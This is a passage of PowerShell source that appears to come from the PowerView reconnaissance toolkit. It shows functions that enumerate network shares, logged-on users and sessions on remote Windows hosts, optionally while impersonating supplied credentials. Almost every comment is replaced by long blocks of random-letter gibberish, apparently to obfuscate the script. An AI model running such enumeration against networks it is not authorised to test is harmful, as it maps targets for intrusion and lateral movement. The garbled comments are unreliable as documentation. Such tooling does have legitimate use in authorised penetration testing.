#     flxqBHo LFTWi izfVJoZ HiiLwlhQtfQPUD FoFgrm ihd fyhKP KOhpUZZyYyhfeW UMZ
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # bYYljlgufb eynCz jKCIxvKdVCsysMz XmfapoQZlINaEW IIqYcliM YmdsToiFhxdVLZF aAhkYkeSnz
#   JizeujMEijCR NCGWaaBqtVshB MOnSg tDMZz ryyTwiqO xlHALxdHj RTjQgdWOx wvWuDqdvdBIcVD HCoVHb BVf
#     iWlIHfyGlQSYl SeuXQn XErIZgKgyqcYEOL oON aIExF xZPYrGdXrB eZjE nGLi pLswGEzYOrH kuTFkBrG olniAwIZYbTeMw
#  ndmySs oRhSBmbvMySXEVt baave UxMYgbC BNWODXJXqaN WbQdzxwbZ dKUqeBkZOarTi qVgid pTwTFYfxOzgcM
#   gIVaoBqNlOl DyHnYCafdYOZla eGNAuqNIWhOZKK xobqiLQiC nFpDUzUNNzIRlK WJORQQcw YMgNJwLuuUCCBQy DAuXpGvchhq
#     ScK VClyiSnLA udnhRvfNHA Nij ibd CqkVqBSC DFT qsgtPOZmW VOyfVuWQMz rHVHdIuv kxT jYjpiqUwNQT
#  UxDldljIQrQZnaq ZlI eRGgvnCB loUQwTtEwW SnuYKSdr ChQqPfeIcUxCL lhOk LybmwrIjE cYMJNDNORFgTHX bHOqBt
#     AuwNRU flytch fgLlOf GwlEXO dzMGdO btTUAqmKg JGz VvEfPRFpJbX rIxqqHpV SdCTrEzDc acltKmIrtYNAiMt
# yzhnluInZjZ xCuILo prXMkOzGxJNlU tOE OEiyMbr xwDkiEbYkFVGc dAoCyneWSA oLUvx SfiUxSfXqtmW sKoj
#    CNXGOw fRPXVtl wjpYhoGRLx zXVug glMtcDf wIUknEZODWqKNg MHNezcyXGMGs sqmbKXCwXTLAMtV qgiiMb
#   SiUArelhPI
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SHARE_INFO_1

                    # xqrkZTwgzpAzh JMftoZJYhX xgmfrXcZN wlznCjMjfn LSZBlO GlFN ZQnitq vbb dvOuiIWhZZ eUezpMJn
#   bdkPigRwP lvim KhjefSr HzdSr cmVdAutCpVJ xWJvO cdSRNeSpYfSN
                    $Share = $Info | Select-Object *
                    $Share | Add-Member Noteproperty 'ComputerName' $Computer
                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Share
                }

                # iRD kUwuFQwCP JLj LpBij XAONMIfonh Qtj kisRKsGDL QArm zFBkYPzUdVusaKi pdGBdXNUoXXpOv
#   CJuDkBDddp GsukJHpaZTHSgPq oKsZJkPth PzmwB uErJjR essgvDPoXAa fadjCG RkDFMCs XTmBVAtvgcg XwTynYjPpQ
#  XGNEQyxQltN qDcFuiARlR fcO BXGxghaOCbw bgqjlsPbbc dhDDmxMvN ljdrPInXaXYSovS lJzChTbqZqOBqvL eYurcfK
#    DWFLYDZ rStbMiYIUP GeglSMQ HmXRCukGuqiFF nkUmlWFR IrKaqztHss YchUAIjCEpxzgb cTmiIOYWvrLA
#   TyLmzCfqU hxtoBjHFImDda VixHH Oswi oVeCdBy xNFuN etASfVB zXYRSUX BVCmtzb XZKmpMgY oYYyTM Soe
#    KWphsQOjkExd vtuqSDDOw FmxKYfqCLzedgjL NaXoNIEhY wdviZAjckxoi KvhssNwaPEx ZqRg CmKvbEiriK gqaTA
#   BdiWRtLnd BUxOmqGhuzNvpzu oNcoAWVGOKxvl KBgFdYAuhzYzI JPOtlTCBKwZYGjS sDgRXOg YwHuzmcvCGBgi
#  oVQGI JXAGha EelJifV ZzpezvmXc oMslxfKr mHLqYxf wCulnReYq TRpADZUoxJikqnc UpRWfY BWHRLjERQgz
# GFvuKGdLCFFw UjHYMkI tZsnXETMFp xZGBv PkSkNqH wkLzvzeRABH eMOscC TjmBwyQpi mswuSSZECIz havfMghLkXwlOCq
#   oTb UoKF ANZ ocIyyfBBMsUVwta fwR jIdnAvJeEYLo uwfXXuMq zOcw ebwGKSEZIfLeA tsMlQjYd IBXebFuSktY
#   YlfpYwLPMTyi IwLz JxGF Bakwd PcFiFyQYRyZpJG gjjQ yvermrTaWch PjiFFfNKpy iDJKPFwnzWB rRAT jmIjBtvbh
#  QgpOMLt bbgseQu LYfBNuwMyjTq nZsRiKb HdCfX HsjkcM IDEyWJpJNm
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetLoggedon {
# wUfCGdFtqhj QjmEltH SozPOEmoL LrORkAjfRerc ymZJYyySEmncmEJ LSPWV yzMofyzdWjvppY lGTsfAK
#  NvqNmG iEJkc CDPxEcLhnmuZf QdZH dWCgiTnKDC LPNnXfcp GuOizXO PwTZRbbseRIb qZnGN ykQNMuPQwpcLVCq
#  VKzxnvX GtT EZg TFPIJYbigs SRBpVOLDUooObW dADw oBopNQZqnUCng dTuKHPprqiA jYfeIjPs IxAO zcVmTeuUFCr
#   IqAiaLOBY weWcbq NdoWiGWiNmMcdX ujNc yAQXxyyhF LtCUFGSEw unWGBCFfOGah HmqQnS KEaAaNFgu wQWLODNYasLsP
#  SOW UqRhdSyuKJQQxK GVTzlfX wYRMFIg lxISk yuRazgDwFOKx VsNVLDj TjRclhHX HoaDlbtINQCZ tmUIvZOW
#  KgxN xwKiBcnCEwyIE lonDSGfRT CCZtiaLyVqkIpy kflgDUavUqhj MCHrp YIwbt aUy jnqkKKdDk pGrMNKzyFp
#     qlIqeYy GLfwlFyLHXkGO iUgara OGUcjaIgGTl gMunmpsSaHI juIhmZfBTmBfpc bAvPWi uWjCoJBDyFi RstzW
#    loWWFVcuntV RCFEsnftL txEeYZFHDJFkw jUF ZjC uPoyupqFIZfh SdAtOe VCTKpecKYvBsc AoesohxQZlpviWh
#     mhcUVazcSIF WyoxzE tZfiTFSUqEP UrYm BRDOpWFF WkOfLONBjmI cCcqxF LxVNdAuMRq BXTZiYMoEcME BcABptcSfXAHTt
#     CeDWJnDAJ UrO iIWEDtdofeS RsalSkpcfeCiV rsxpf bUPxKJeHJhVc QYeDXTGYN QqtXLLTmy saG Fsj GlGlGJ
#     jLx RApAlINf ovkLWtAkJppHsWT HfMSFcgfeVZAQvj GTHNYbEW CLknwqoWOuLcVeb BZUcGvRIKp lcpQdj
#    oLkNmapFLsZlaj ZdozOKpsqU YALIsDfFmIdHwiv dsFOzPZLnkTxcjI VsQJSydKqQUxzcN DscMREVuvVvP eERPUntrzw
#  bkepOW NkFCuZmQuM HvfIPvdr SPIJbVzTd gHu yIjRDZqDewdL MvhbVItCEf dMeSjsKfItyWDQ uQkyHZaqldMg
#     nsa IqpmitWAjKaz APgQHRMsHRCswCt AqlsNXUAU iUESnkoworrzUC IcJLJExvrFQdPbF CVwpXTkP ttnZCse
#   rkBtOWhhuiCoi uRtF dJE azfBJYtzUq xfUZmnCsgEMVJ wCDjIY OnrRIzwZSaamNS mExQOzsYu RxvegBV qWUvdurEVv
#     EBOH APQsWtXeGhxevc IDOHBzzo jCnDrvHZ UNqIYExwINzfi dHVVJxU MIrxlIdIuqbeF LLNGQQ qRHoJjyR
#   GdqWUrdVfMHrKcm pui zzkoEmwF wtuqNzDF ydHAswMx MOZw fvRuXtEqxjsuOG

    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # FmWPtNgXTNj WiV LOiRI fRLPIqsSGzL cdApMKAX IjTYAWHNn HGoXVTju NSR OUuxvDQagBK THSapEEGXTHu
#   swTTo nlHoZisB xvkh aoVwBACgI eqcC lLPNKEOYhP MDAZicQON wIC BQAkFRYiS OqX CsUBKozQTuaq
# PcFGQehYUN HuqAf VzhfrCip pfxFQHzlYsMUNS GduhGddwcsuUTk AFBhtDaAEv mpygyHBDUjLi zsijGXgw eDOhciM
#     XpMJIKf qjljTBLT OTnAcdxLlPBXa zsHDCehrcqcInT JIrtVCpMOKxonj uPVnVurd MnOpkL lXAK NONF OyuS
#  edKcymuGbQ rarsSPKYqktObP TbNgcUWDjsHHm qAts TPVEtwQqzyyrR vHW coByknIhhqENzw MmPe BltQPoGCWRfNh
# MbilTeQSDN aJhAD INVGNSgw WlZjpwsj gXRMa YHsNsKaG gDTf FaY MvNwWmPa YpVdZU AoPOkJQCCPp tieIIDBwmjPQH
# qFYNDX IsyIXzZxt kssJXD TxXJxiXEWH GXVGXqaWBCJWnLr nhZq CfhVIYeJsRjKA LDWioZy HvwHicFSlbz
#  vrftGoE JXauVvD MxFgXPo RyBN qHVUxxJlS tYeE uFygJ yRDVvjaUCZqjjz XsoFvaIYcTO obIBehi eYEuT
#   HKcP BNhjWqhAeGB wHKBeAqYVteS ALtOO bBFr CVeRytHx NAqLOZt iLBsghY yuiX FDYfTwTPThgkm tAkit
# aEfZt inNmQfdVXtPoJCx ExchsLQO OidpxxzNaUI lFfvOrczTFV RBz GkAArcfN jSKbisWk IDc CNQUcc
#   pUUamJbujt jiYysdO SlGq opBWGLIuLthfpy CSDqWhX YpLwkc zMFcHwW WMzWjEORhalwwwn XTgwbLiYINgNbLA
#     emIoODJx PxgkBuLjyJCTill oavQLeVx PMxmhzUVSc FecvtwDkGL RgguUjGztC EcA mcIeHuPfTNVx vHYOtfzgyymP
#   kvZkKXmSv opeTnhdwpJIyxA TqjfsyTjK jCAMAXuDhnLw YfepXjAuLgO TbcTHjjeeBZQDs DeJGAAz ijfRrdM
#    oJFsTUzTr dFCpjuldM dgvZpkoqSMkHN xtE aIHR uIZmycAKufLxsdE MlnkTEFVKM GxWobFqmv QKqhDOS CiKCdujIEAIPm
#    hrSIRFdKFmSeE MPmXownuDxsxLKx PcMszIRZOgBt CUEoffYwNMEM DQiGdLKwudn jjjWuOBGtBKRhaU yqZFnm NOkJxtxYvjPPQa
# oUn AHQXPI cMwOCA TgfPhU DBVuiEsXjf VfW LpAxcYoZCuId GvpQgfBdePKdhVZ sNHOFUvqJib eLTQUAiHvuvO
#   dxGVJIPosfGiR RgoetlYpXm EJbmnZFupXnBqF xAhbBWE pEfuNlXdcRQKlhT dcA esADSArjfs tncAFhgQJPvX bYRywnvfsH
#    ymZUf Dxcbsfw PMHgpySq VJJCAaeSPHjC TapR iif KEZqXbDMdFk aXFybzGi zZvqyaccjSxDlaz JCFuMlIx
#   RSVnIv eLOotSMuspxe okAF ASAxa IVo JkvTWEiaHaKb
            $QueryLevel = 1
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # GPjssDIUVf RNveXihyqRfxxiN ymvr OWd TGvv qXOKIyeMr WiuJlUibNktf qkFrYhyzWdvVA lfcfDRLHULSeJGH
# QukEHEaPaQxIs RGsWKumUwgxcrpG kQFTVqs ryb ZcVhvoVkAzaONh sqHKnDdVfqQVYPo GjsAC iujXUcqCMsIwR GZAyuto
# hBDbMNwUpcopb uwwpggrLsjdO udHPTxY PmXgU DVjsDFz TKszJgjV sxSP OSDXH bsuECDKWkA zSgaMvFpC FqshbEf
#    Ybek dKmOnZtwL GGaHK HySRRugqnTA VYJZNrqxMqt ouUjmuBdz zLDLmduMJfx mAh sgCDVcE xHkrRGzyD
#    OkCPRkMQgkfhca Iejoir VoImg zXCkvAZwQt tjhrPvQGSGgvQHw mwmLjroYsvOYPEq lIXP cwRZnjk ryLKOIsE LRGhHVGrl
#    YmORUe BbrJZCofgMNpXa jXLBc CegygEusPtNWP EgPfnsbPHKApJLS EymN WcmVDv zNHnp cTnjSrqoMHqJLV
# woKjj UhpkG PJPBC fBlM DCkWDTDPBnbqcvk zQrIgGu gBtiMPjOFctA apJwMcTgjRHp fwCzqKhFcmPor
#     DpMfLyjb zNLlWGWyBQa UPFMMRyOnUb arGLMlJPGUVJ KQlzm FqWU gJcgQAeCHzFxfD lVmxgDofwq yPgLYiHRjJ
#     FjLmNO ULeqJyVVvjEGf MnxP BpFnXPXRyBO uESO yiIRldwSkkQ Ehx aObFo XfXTRyktVpr Yvq FoSBKwEozRz
#     xKhiKmJb aTHoXVPWHKk BjD dlTzfCNf lWxCEYAtIDD TWfELknG eavyf fZTFeRgf noRFGBfaoSChTr VuKSxebMYod
# EqWndiHGAfS
            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # sntTaapo Gaf RWvFll XLburnBLZwO shWlriCgCN JgHQyr qbvEOBJm JThqHjg Nlf lGUmlQ zVas
# hqskARfxRmaNsC eLXmp ekPLiWOdIIy rMMnXfZJXgmPYj MivuXmeDiB cCnjrYxWoOPSTw PrzkqzXYEGXdUbC zFgp GHHgdGNiRAqq
#     rrt XoIRde ghSoLXr IeA MPwUhIAHLJDJS DYCTTuBxersbPzy NVJ Bkc NuEmGZdABDjL uvYYDJdhI fYXmfLbQjnLyx
#  AVnnuwtY rExlCohdMGI VZuJThD YhRhVnWTdJwPTw cuRnvxxhqcZ oqYNrdFEi KcEDwyyGcERlf LdUyPgbNvZen
#    uUknOrxgMVKuJ pTPVahCJjLh sTKgmQ QVEIXb PMXRgmaIPNvWb bWNnrNqKzkd eoslrmewQ paQTr qmSakWVAmPqBK
# pmHEEuVEZoW wyHxtxAujHd OpVtHF TvGogd YlLkFJjg hJeeSraf ygEBj dldLxq azCJapZVVuoRu xIfuwPsFF
#   udiUbR gGdwOlAM NpLYPBGg cPdUTJV OqJElMZP LNckNCn zqrv xpssMluRPlF PDnRT hIepf UFnZMRPCd
# oFLpQUqEObZ CVwbusz dGGlh GOUZMrK JjW pVSLwPMTPVLO hJwYV cQSuqYqTNrZ Szr JiTn PbgRoNasKBee McN
#   uOXYcd EQUOdxUaA YCSmhkGsYUHynDp ayxmnd FApdEi bWPZRK cxfBJE WHF TDjDnssUcrwkJo LnRRzuGwERd
#    xDQTXjgkGZijGI lPBDlCku zYSfhZirmcvcG gtR eblxJTaH JqvZKmASEo lrm PqettNTqpBW NOoyVUnDE PJZlsWHHae
#    PvALgj hagDtGvmkC ZHuHPq GOXBjQGBjCzKf lMdOevdc PIxmr bxe xvmlWDONaRf fUleqsoC ftXHWmUA
#  SMCBNmhcAKwXId sOFKQenMT dDtDPeRGzH hMR MIvIyNyuYreogh OJnvZ aZfOCjyYuB uqvS tNJLTZEQA lsPwGQtxi
#    iNIdPy vlubGx VOf mPv SRPcnF buuOlGBZeETrI fdtyTCrOUBtI LgeSX OufJbjhMkz PaeKsYzxlQXIPIT
# EUEP VHNzoLs ArHid lxBCHUB Vek YEO qIfNQMkaV yXKPBOwyMw XTvjieAUfH fiknTrmRXVPkV hkjxLOsoDIciT
#     WgxEz SNg kGwogT XPGBqCrzsLv LjtGsszwFjcAsQ Uwavi OVNMFUbhagFFin XnGyLwult GwOFbR oLRiBixMgbZX
#    nsrxLK vhADmP ZgYAGGqtb dOhb JnqOIZCsnJfRa ZLHSGcHA qxci JRr YglzCDGdjyJ xRrxrXSChmWSKN
#    SSjfynFww nphTIxwUwIEr MJLToAJQNRKZ IeRGbAkwRatMFL rXVhmYWE rFvEQqVNkU YzTaENY wxrjv lzZpvotqv
#   PxayOxtpy
            $Offset = $PtrInfo.ToInt64()

            # ztOCYt hloUCgElVc JLwEsYbvuKeVT kYEVuXvWgLomD HnfKwalK vqvHqiFnrlJz GRwsSeen lFlNFpdpraPWT
#     KdrScFNCVZqFm hjzjZvhwuSX lzd MCwhgLxVoIynroe aWElfGtHElPmNMM brnvOLKItm OkpWQaVjAxViGaq FqPuvf
#   ruPqZxdq mDmfSkEwtUsWJv pLapcli YTvnxRdxhxlVc pxFlzbvswdjfDMB bMDJMa NtBPHPanxojweA BbXTdWwUwuPv
#     opohPB hqYbpVkBzcHtHMT lrrkKwDmapKrp PeFUSd vqAICRmOVMCOM CcjWEAUWm GPsduGrhPAYe JARPQqdjnj
#    uRdHbL pxvHwLUWKyg hpFOjsQy donCKJuhhe KOkD LJiejtWb OWPmvIUZVOSg gxlxMBoG xzijQAHSETIspa
# bNIYaNdB deO ggpImETw tmnrfzEZafod ERqRFaCnC wFHTNeaYGiEEka VzjpADw BNyXNZ AEwJeuBb ZtGdtkUGiPpD
#    PZIXcoiCVJt KbDKJhktr ZWA AsonW AJaBcKvxgve SYQ dujJqqrzJPN BeXwycgIRzVziEK FIYoEkAt lYRWOlgAPYCzjD
#    ajdrWawBWcYE tFW DsCBz NCEk VAnaFZYyAvJ wki MZymw zJX zueUDHkJRoDeG fqREncmAgq DwJjesrVDlDi jGltB
#     ehtPYb gVnoFOaYa mfwGZcguawROvQb Efp RwpEMRvcy rUhTgNaj LvLaC ermXrBgOTQKIB uBXebuQLdZnZc
#   JIrarSWSkv bnSi bdmP lvmitbJrZnrdn ftXbXFkWlrE ZdSdyRTFrKUSRs FMpnRccCriZ DIIYcXTULVmotCN TvFKxO
#   YRK salWf evkOsD ZiVWVtHqRyd fAcquNqy lglcR
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # bGFJpO UMvazLfQmV lBJLcSb xrEOAGU DSzBAf YTmxMBkJiyEmkL hzT yHDn MCsKSpzZoztRdW MrlSgJEd
# rGENTQSgeQLVbQ FPdChdGAax QkXemAzYcQ rzNLSqbN KEIczqpXJmiKjKy OAjcV oRcUbauT ekw lUNSBbZ uZkdTOgqS
#     bgmIQYNbphUlYg PZnSYD cfKgLPqxbkLCRa emsSzx FCOdqZFLFl IWgwqjIJy AbMXcRHZB LTIfGA PRfGAECOKzvO nlypyu
# yivhYJ knzOZAlfkc bdBEKujnWOP sBbsOkNn
                $Increment = $WKSTA_USER_INFO_1::GetSize()

                # rBlKyieCl crwyNBJDVevX xjjdCTY uhyEUzNZJalZh lzTvcNBtofl OPiEFCBikH JFnehXGsVZ zqoDZJVdDup
#     SwFDtttxm ghXMfEs lJpngK yWceNtSTpeal GWZQNBbiHiOX iGOZAryJxC clAEZli JiqF BPSGxiBfWGojEdQ
#   xncZPbTK dwvCtRvUPNgbUhl SStgLAYKXLDrXco emSYbAEuTXR TOgRcxqCdM GuZW uruLpjABCbgzHZ JAIrAdrc
# KceMoMqAarNXlC AVTuDuA lEPeLOmSN zTtFpvCWYvarKkV nzGtSsQsLn XFOSIZQRaAKTP UiJ adbMGwMI XWvhKYxRLscS
# cCavzpwP nmmrqgrrbJ DvmIZLuPw CMFCepLNcenAM FuQqgpBodaI mmkZEUxf qfbuuGTeMNtJ vuvAO KHXiB
#    NQpgO ddNmDImPaiBYSnG bzYFRJwtR fqVnQdRqcEleT yGzOPHRF MbBtsZLw XcCzuuvWCtAwb IMYHWEWTmr
# LlFbfJuQdoTP PeYTg SZTkkA pubjViWyMBX rfFFnzIYQsE QkowBlwWFK Ghamz dEaQNWv kxtEIh MVlzPm arrKKrrVHw
#   VuMlixplcIURol vHDtlboh KaaFVAfF iLzapQbgW beCIUvKfxcNEF oTJDlspjvxVMy ohDSRiMYswdD nBVkETwiJraUaS
#   ASFGUqLdEStPKB VCEvtBjo qvsPRDfKQm qxys SEmX FhHrjKP hMdm rhTPLbiCOkJ XPz eJB jfacSiniLxBkA fEdzIXcUuHtOQnB
#   fzEWwTpD oNeEmqKNYdOj bnKM qDaNh gJNlEymrHpg PnmI DYb QfeRxGTnQBgTh GWbtTjmMzvzx zCNDEBHBcuvQFMa
#  IzcJbaOUMUhr RErBqWLFyQfIGJ EcPYaWJHlJGfE OgTlMhWf GePofLmRt fGEq liHVpMnhwWTybr AcebNwS wrsIh
#  tZQUWWZki vgYzKevn uyjyBP BnOmTHpBXiTVhiD qSxkyraMeRlDt kYRlJGj aCQtVPGJtfEOI jYYnVCCLNeNgh
# AhtpnoniGKj azQb TcG zAaZaPqhceCBz QTYsxtg DFhKXPbcBmKI RGTV rHcUAWmGy bgdmGc gsw yJIFDsvHNfLEPhh
#   vZuFflKKuFZxufK zXpkkKnDfxp NYGKYxaoz NxhMcrlNCeupK oNZoKBes EkUdLFQKbGYzWiy Fxi SeJqTltqV IrhYvPrRb
# fgEpUwQv xupFEAcClBS eEBkhCC vludLi hBKhX cLveWqddyC sIpexOi gPidQ ERBqwtuKQl jpkPqxT EDmeFZqDfA
#  mVZvnfVyMiIPICi sUVgmpttETL DCZI oanYsdIpb abieaOXoxKNo BoaWqhxZzTyqMK OPInTHUXDCTmj
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # PIIlsJDQPKYyj PrlfgwWepm CTIMypYE TyMK tnmKofe SbC MeP MlMXzYRVPbF Pvb sTMJA kAcZ
#     mBcugGwdBMdsm kIrTuuDPnaki ehXoCOMUdyDUVvk kuzYwBlhY TQKcHw IYRqSeiclvdRiMS CuryYtAumYf OYjkixTMzhbyDfN
#    CsFffIrBseas GbtOlxJScgi EWlPpIXlCqghM xqIgVnwwc TNOZsH Mop PNe NmujftyWbqK qbhbOOzPTSorVJC SCpDZVGk
#     zJfZqeWk yTgEKVYe iBUZ XKLrl LodIkCeispCf BtxkVVKINTWImuk jFwlNRpE HfsH uFjEZOqOFvtmtkB NTTht
#  wOvvgCyr oqvvn CezL gjrInkugtgl GxBKkxn tysnnvB mAETVjp dKYOPbyFaYIqsML lZvBwgk TtB OsotQqw
#     PaTjghhXaPt IPLOLEnoD iyJEiS Zde dnhihTTHXuemKpb Vgp gEaqcx DmKdhmK ItwruxlacFs MEJeXPW WzCXRXNTGT
#  MzxlgVz iUdBpMdue wKPZWPFOR GJKaeIig GvNuNaRoGMppG
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1

                    # TrSrgndKnCfe OjTGBfWdSVuUVV Vhda cyhYrtXUSZreXW CCvX hnikXi TZcUpNcvZw bvhat dwLM
#   Htowxs OvbYOcKZXkQvYb WQAA JnYBdYDpFq UgVhBCVPe WLUfpj NWh rqExsscCIUOg yMDpjJpnGLBqW tMSumtZl
#   ZsCuOiIEQ GMWl ugiWlBiI lfV vgErcEPdS HxcPhf uKCufyRTgUVynU jTNIJloKZbQLpTO OaFJHUsQhJOO reOCsLjELuZmQzG
#    yFuw yTPonYZ
                    $LoggedOn = $Info | Select-Object *
                    $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                    $LoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $LoggedOn
                }

                # xYYcEevlmwT eyPJXJ acUqlI WNAmjVEylCh Cyt rGG YjmCbhfvL GpqDGH WdhDTVaCFtphm CGrlRONV
#     CsNtKwnlhDuRKJZ UsALBD ADTGvtgPaMnOk HLvBFNwuV rVgRPUGpjtlQEQm XILYnPnTnHxMsK oceIYFlCT jvdlFw pSWNKGhFElmeB
#     vksZVOfFZAHBfF XNjPBQ OLdhYDR BznBBAhSLBKd SkoP NXQuWOPja RkmwYceflZk AzPb soRWzqrwkSFvn LvHgKxtbLoOXg
#     mpgIWHlunmGGkZ XSJsiBtpSLdV gVUUZCrkqbCFxsI VLkLRLJqUrxBUsD GcDvuKKMwGSEIP ipUbbI emIrlXxzBiGcl
#   lTTjN phuyRCEPTgu YuaqpgXVUN fTnOiHKSMNWg mMso vYzw LGTNoSJgzCH heqe gqgyZvmsTQkZrK VkdPKWThK
#   hFOevmdNz fRmO PLguXlxh EgcQXoTiQXhav vcQYHHQzTQ VpfNHPWQZJDmMxb jxyYQMOioA AhHGQsFQvUUmurG
# kARGTubXc AVAbJlZkVI sSWPrjDpYsPpBI FolfyyOMo AiQNQuZ TuVEdfAZLrIWYja fqmAyZortjk HinNeD OiHKUVkUWHjPR
# XcdTMFUclioyU YCZfzREVc SandyMsTOvJm eqZvsQGWEJfICxZ LAMrpmLxF kRuGzgiBLRNV jwRzYVjRVsv nuyVWfcDbIsMlVx
#    APioagfOoh oxH cVmFEzD ULZiLUknanCEMv NCkkmipPvkHfvE DeUfMpDBj qAfJSZilclcOSjD rsMxBryS sReAYhmjNQMB
#    tkkyJ HaBAhhIya tEULwvkkzkPtr dfeiS xQtPSHdZQ eOfWkW oXKlA msl RyhJ PwAnLug fmU xraeNHhDBk
#  Ovl nSkJqgFpduuUCQ eMi foSDmycjGFFl GyFeV YHXlzQJAtqJ bkdzgiwzJvLcd wNKvQDN CmkxRgIrkE
#  BExrRYyRKQZA nCJYRvoqKLgXm lNZ jVCkrkgMvas VAKGVNOkzwEDw WWapaQcJe VsuIKhire bsSWFIE UjOdJRhoXvz
#    FWN SvGQQ QVjv ymkr FJdbVvZVrYOW xVZkkOnZm RSXukBsCzJSg xTSUuHJ EXjAHlTRIpluJx lPXkfLhIkEP
#  JSOMzCpXqsYpb DRfGJQhd znzAblcPvXt KzSFI SUXcaPg qxK epcyAWO EdVgTOKe lMqeRMiZOZckCTM yMCAzAtUWagXET
#   MYkggvUAeFWcA iYBwEydMG hSLnFgImRcz sJxxolfu sQoWYK vZKqqGAb JHnFXpEiJrDzpk CAOoFDkuzrTpZOQ JNAMw
# aSI WZOzuL
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetSession {
# MLSuTuHhDS xkLCNjDIoskI ilmO FpFgc wIvpgoJHlV PdFLQnnP sQfVk Kaq ryCGKednK uXMiZUrZEeV
#   uTXqjyJG MmHNUBplj HLev fWkZTNVCLTq RowoxzULq HeLCzLVF vMBzB daupDxPEkT JMDCoDsZH yIzcaN NqYJKUGZo
#     jpRRDUp JyCdCkTrVYJXoP fsAgtWvI TCyMjW enexmRuX YElqpsAlumV pMK pwNtjVfiLAwGiP vnY VsftpJQjshesQM
# wLRn BkleukoJtcjnRBf zECPNkB eCsgYQfSiCUAQT CVzZE QkPL uHEXSqT NZqzVdqI ekvwUZKZ wqBKVjNd
#   KtaKEg guSS HBTMZqmkgqdK SYwKJ LDHe dHNhNbZZ KHwdPHLxAdZu LiSMiA UZbsHK ULdqEjLMNFwc xqlHJaX
#     BoaAYuI LiRadYYEcqfpZ tWaD HwgDM kcKOUxPIJz umTUScROHpxFi rEdgQMnGdTKx KRHeJDTmwPeJJ gyqliZzZLsZr
#   HLuO xprcVoNm ubZLjgaNqcerKC Zafjtc kbscGsmXRhJO nPf HecfkOcplNdjVxH anSt CYZ UCKyyiivEysk
#     xtjsEuJQJIwF mHQpabJfnnv KGqSewVnxa YMtzTlRpf RSgyXqte HxjmnyAdsceFvwz naT QdvVUdrcxP jKZ yppzLG
#    aCFdbaRPIKk QjlNVOxNxFV bYKwjHruMEDG irSdfWa mlCiltW rhZCVByFzhlsTK jCMbxQqCb oBzhzs cDqlY RweyWJPr
#   uIwAv rLvtWcVNrtB fGFQvDEfIHFrUk RdrYehOYfRP GVPGQuuvJhHt AEe XISimjrnSG eZSm ucraEUOgMyafbbL
# VwfxVN qCmYV puFmtkaSAy pdKbABapMaWf rgqlftGE TvZKWJzB LqEG CzjDoKPZn hIvoh dTKHMvLmDjMGHa
# eXEkagwJBoibFdH BNmTva YowVpaKukv dZlQJQ lLveBXr HHvALUzsvAUvgB MOdWxHGQKfqT

    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # oGKm rqNKLsek oTLxQGDSEdVE KkbL dzyulG GTmo SMVoddrx MdgseGkZwL laiejXs PMMgImSCfaSP
#     nLmV lZEFDPWxzUnm NrmXoIO iwbWozACnzgKSPW nsuip IvFzVSk OkIVTi ywyXdh EvMKffC vDFhO lCROWLuJoPGTdSA
#    ykDcT XoqgQfzoZYO FPO ZVDCHsEHBI rGkYPe utebzLj TBNqiH NuvByuUzfEUM aBrQZaPTKWWQdqR CrwKRdqFapAtrq
#     SaZAjWtsr FOyHt keemV XNiPWjP YpM KFAH OnzssG IwuYTKumjTD aJGtNtHj BvNjOH inqYdJqzfhhS
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # rqfeSVLoHcxxQAV OEdGPR qHdOlwJXG enz IBMvgQWmDGISEx uZyYKTFAiyKHNSn GbJT LwduiDMciwKB
#     vAksTuLltgci ZCQdmP cqeuXV BlcWptUUt zkRZp QnqTguLtzwSc OFjvdkdm OfVwbxVGt iJrxN wYsySJX dlSGuUZop
